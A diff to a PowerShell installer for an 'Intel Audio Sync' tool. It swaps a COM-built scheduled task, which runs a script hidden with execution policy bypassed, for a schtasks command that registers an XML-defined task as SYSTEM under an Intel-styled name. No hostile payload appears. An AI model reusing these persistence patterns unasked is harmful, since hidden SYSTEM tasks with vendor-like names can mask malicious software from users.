@@ -12,9 +12,12 @@ $TargetFile = "$TargetPath\Intel Audio Sync.exe"
 $TargetZip = "$TargetPath\Intel Audio Sync.zip"
 $TargetLog = "$TargetPath\Intel Audio Sync.log"
 $TargetScript = "$TargetPath\ias.ps1"
+$TargetXml = "$TargetPath\Start Thunderbolt audio service on boot if driver is up.xml"
 
 if (Test-Path "$TargetFile") {
   Remove-Item -Force -Path "$TargetFile"
+  Remove-Item -Force -Path "$TargetScript"
+  Remove-Item -Force -Path "$TargetXml"
   Write-Output "Project file removed"
 }
 
@@ -40,18 +43,4 @@ if (-Not (Test-Path "$TargetFile")) {
   Write-Output "Zip file removed"
 }
 
-$TaskDescription = "Running Intel(R) Dynamic Management Audio Sync Service from Task Scheduler"
-$TaskCommand = "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
-$TaskScript = "$TargetPath\ias.ps1"
-$TaskArg = "-WindowStyle Hidden -NonInteractive -Executionpolicy bypass -file $TaskScript"
-$TaskStartTime = [datetime]::Now.AddMinutes(1)
-$service = new-object -ComObject("Schedule.Service")
-$service.Connect()
-$TaskName = "Intel(R) Dynamic Management Audio Sync Service"
-$rootFolder = $service.GetFolder("\")
-$TaskDefinition = $service.NewTask(0)
-$TaskDefinition.RegistrationInfo.Description = "$TaskDescription"
-$TaskDefinition.Settings.Enabled = $true
-$TaskDefinition.Settings.AllowDemandStart = $true
-$triggers = $TaskDefinition.Triggers
-$trigger = $triggers.Create(8)
+schtasks.exe /Create /XML $TargetXml /tn 'Intel Dynamic Management Audio Sync Service' /ru SYSTEM /f
